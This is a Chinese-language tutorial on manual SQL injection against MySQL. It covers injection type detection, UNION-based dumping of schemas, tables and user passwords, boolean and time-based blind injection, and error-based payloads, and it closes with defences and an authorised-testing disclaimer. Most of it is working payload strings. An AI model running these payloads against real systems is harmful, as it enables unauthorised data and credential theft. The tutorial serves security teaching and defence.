```markdown
# 手工SQL注入深度指南

---

## 一、漏洞原理与成因
### 1.1 核心原理
当应用程序未对用户输入进行过滤，直接将原始数据拼接至SQL语句时，攻击者可通过构造特殊字符串篡改SQL逻辑。例如：
```sql
原语句：SELECT * FROM users WHERE username='$user' AND password='$pass'
注入后：SELECT * FROM users WHERE username='admin'-- ' AND password='任意值'
```
通过闭合单引号并添加注释符`--`，绕过密码验证直接获取管理员权限。

### 1.2 常见攻击路径
- **参数拼接漏洞**：URL参数、表单字段、HTTP头等输入点
- **语句篡改手段**：引号闭合、逻辑运算符（AND/OR）、注释符重组
- **数据库交互风险**：可引发数据泄露、权限提升、文件读写等

---

## 二、注入类型判断与验证
### 2.1 类型识别
| 类型       | 测试方法                   | 闭合特征        |
| ---------- | -------------------------- | --------------- |
| **数字型** | `id=1 AND 1=1` → 正常      | 无需引号闭合    |
| **字符型** | `id=1'` → 报错             | 需闭合单/双引号 |
| **搜索型** | `keyword=test%' OR 1=1-- ` | 需处理%和引号   |

### 2.2 验证方法
1. **基础验证**（以字符型为例）：
   ```sql
   id=1' --+ → 恢复正常
   id=1' AND SLEEP(5)-- → 观察延迟响应
   ```
2. **报错注入触发**：
   ```sql
   id=1' AND UpdateXML(1,CONCAT(0x7e,(SELECT @@version)),1)-- 
   ```

---

## 三、手工注入全流程（MySQL示例）
### 3.1 确定字段数
```sql
ORDER BY 5-- → 正常 → 继续测试
ORDER BY 6-- → 报错 → 确认字段数=5
```

### 3.2 联合查询定位回显点
```sql
UNION SELECT null,2,3,4,5-- → 页面显示2,3,4为有效回显位
```
> **注意**：部分数据库要求联合查询字段类型匹配，建议使用`null`占位

### 3.3 信息收集阶段
1. **基础信息获取**：
   ```sql
   UNION SELECT 1,@@version,user(),database(),5-- 
   ```
2. **暴库暴表**：
   ```sql
   -- 获取所有数据库
   UNION SELECT 1,GROUP_CONCAT(SCHEMA_NAME),3,4,5 
   FROM information_schema.SCHEMATA-- 
   
   -- 获取指定库表名
   UNION SELECT 1,GROUP_CONCAT(table_name),3,4,5 
   FROM information_schema.TABLES 
   WHERE table_schema='target_db'-- 
   ```

### 3.4 数据提取
```sql
UNION SELECT 1,username,password,4,5 FROM users LIMIT 0,1-- 
```

---

## 四、高级注入技术
### 4.1 布尔盲注
```sql
?id=1' AND ASCII(SUBSTR((SELECT password FROM users LIMIT 0,1),1,1))=97-- 
```
- 通过页面状态（200/500）逐字符爆破

### 4.2 时间盲注
```sql
?id=1' IF(ASCII(SUBSTR(database(),1,1))=115,SLEEP(5),0)-- 
```
- 基于响应时间判断字符ASCII值

### 4.3 报错注入函数
| 函数             | 示例                                                         |
| ---------------- | ------------------------------------------------------------ |
| **UpdateXML**    | `AND UpdateXML(1,CONCAT(0x7e,(SELECT @@datadir)),1)`         |
| **ExtractValue** | `AND ExtractValue(1,CONCAT(0x7e,(SELECT GROUP_CONCAT(table_name))))` |
| **Floor+Rand**   | `AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(user(),FLOOR(RAND(0)*2))x FROM information_schema.TABLES GROUP BY x)a)` |

---

## 五、防御方案
### 5.1 开发防护
1. **参数化查询**（强制类型绑定）：
   ```java
   PreparedStatement stmt = conn.prepareStatement("SELECT * FROM users WHERE id=?");
   stmt.setInt(1, userId); // Java示例
   ```
2. **输入过滤策略**：
   - 白名单验证（数字型参数强制转换）
   - 过滤特殊字符：`' " ; -- /*`等

### 5.2 运维加固
1. **权限最小化**：
   - 禁用数据库`FILE`、`EXECUTE`等高危权限
2. **错误处理**：
   - 关闭详细报错（PHP设置`display_errors=off`）
   - 自定义错误页面

---

## 六、工具链辅助
| 工具名称       | 用途                   | 参考来源 |
| -------------- | ---------------------- | -------- |
| **SQLMap**     | 自动化检测与利用       |          |
| **Burp Suite** | 拦截修改请求测试注入点 |          |
| **HackBar**    | 浏览器快速构造Payload  |          |

> **法律声明**：根据《网络安全法》第五十九条，未经授权的渗透测试属违法行为，本指南仅限授权测试使用。

---

### 引用来源
: 博客园-手工注入流程  
: 报错注入函数原理  
: 新手向注入总结  
: SQL注入基础篇  
: 手工注入实战案例  
: SQL注入百科解析  
: 注入类型分类详解  
: 防御方案与实战技巧
```